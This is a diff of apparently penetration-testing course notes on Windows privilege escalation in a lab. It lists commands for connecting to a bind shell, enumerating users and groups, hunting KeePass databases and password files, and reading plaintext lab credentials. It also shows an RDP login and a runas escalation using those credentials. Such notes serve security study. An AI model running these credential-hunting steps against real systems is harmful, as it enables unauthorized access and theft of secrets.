@@ -1050,19 +1050,19 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 - Situation awareness
   - Connect to the bind shell and obtain username and hostname  
     `nc 192.168.124.220 4444` `whoami` > clientwk220\dave  
-  - Group memberships of the user 'dave' (544-admin, 545-standard, 547 limited privilege/power users, 555 RDP access)
+  - Group memberships of the user 'dave' (544-admin, 545-standard, 547 limited privilege/power users, 555 RDP access)  
     `C:\Users\dave> whoami /groups` > CLIENTWK220\helpdesk, BUILTIN\Remote Desktop Users  
-  - Display other local users on CLIENT220: Administrator (disabled), BackupAdmin, dave, daveadmin, steve
+  - Display other local users on CLIENT220: Administrator (disabled), BackupAdmin, dave, daveadmin, steve  
     ```
     C:\Users\dave> powershell
     PS C:\Users\dave> Get-LocalUser
     ```
-  - Display other local groups on CLIENTWK220 > adminteam, second floor, BackupUsers, helpdesk
-    `PS C:\Users\dave> Get-LocalGroup` 
-  - Display members of the group adminteam
-    `PS C:\Users\dave> Get-LocalGroupMember adminteam` > CLIENTWK220\daveadmin
-    `PS C:\Users\dave> Get-LocalGroupMember Administrators` > CLIENTWK220\daveadmin, CLIENTWK220\backupadmin
-  - Information about the operating system and architecture > OS Name, version, system type, [windows version~build](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)
+  - Display other local groups on CLIENTWK220 > adminteam, second floor, BackupUsers, helpdesk  
+    `PS C:\Users\dave> Get-LocalGroup`  
+  - Display members of the group adminteam  
+    `PS C:\Users\dave> Get-LocalGroupMember adminteam` > CLIENTWK220\daveadmin  
+    `PS C:\Users\dave> Get-LocalGroupMember Administrators` > CLIENTWK220\daveadmin, CLIENTWK220\backupadmin  
+  - Information about the operating system and architecture > OS Name, version, system type, [windows version~build](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)  
     `PS C:\Users\dave> systeminfo`  
   - Information about the network configuration  > physical add, DHCP enabled, IPv4, Default gateway, DNS servers  
     `PS C:\Users\dave> ipconfig /all`  
@@ -1096,22 +1096,22 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     KeePass Password Manager, 7Zip, and XAMPP are installed
     ```
 - Hidden in Plain View
-  - Searching for password manager databases on the C:\ drive
-    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
-  - Searching for sensitive information in XAMPP directory > passwords.txt, my.ini
-    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
-  - review the files
-    `type C:\xampp\passwords.txt` `type C:\xampp\mysql\bin\my.ini`
-  - Searching for text files and password manager databases in the home directory of dave > asdf.txt > password: securityIsNotAnOption++++++
-    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
-  - check local group user 'dave' > Remote Desktop Users, helpdesk, Remote Management Use
-    `net user steve`
-  - connect to CLIENTWK220 with RDP as steve `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`
-  - `type C:\xampp\mysql\bin\my.ini` > contents of the my.ini file > MySQL password: admin123admin123!
-  - check local group user 'backupadmin' > not a member of 'remote desktop users' or 'remote management users'
-    `net user backupadmin`
-  - Using Runas to execute cmd as user backupadmin
-    `runas /user:backupadmin cmd`
+  - Searching for password manager databases on the C:\ drive  
+    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`  
+  - Searching for sensitive information in XAMPP directory > passwords.txt, my.ini  
+    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`  
+  - review the files  
+    `type C:\xampp\passwords.txt` `type C:\xampp\mysql\bin\my.ini`  
+  - Searching for text files and password manager databases in the home directory of dave > asdf.txt > password: securityIsNotAnOption++++++  
+    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`  
+  - check local group user 'dave' > Remote Desktop Users, helpdesk, Remote Management Use  
+    `net user steve`  
+  - connect to CLIENTWK220 with RDP as steve `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
+  - `type C:\xampp\mysql\bin\my.ini` > contents of the my.ini file > MySQL password: admin123admin123!  
+  - check local group user 'backupadmin' > not a member of 'remote desktop users' or 'remote management users'  
+    `net user backupadmin`  
+  - Using Runas to execute cmd as user backupadmin  
+    `runas /user:backupadmin cmd`  
 - dd  Searching for text files and password manager databases in the home directory of dave
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
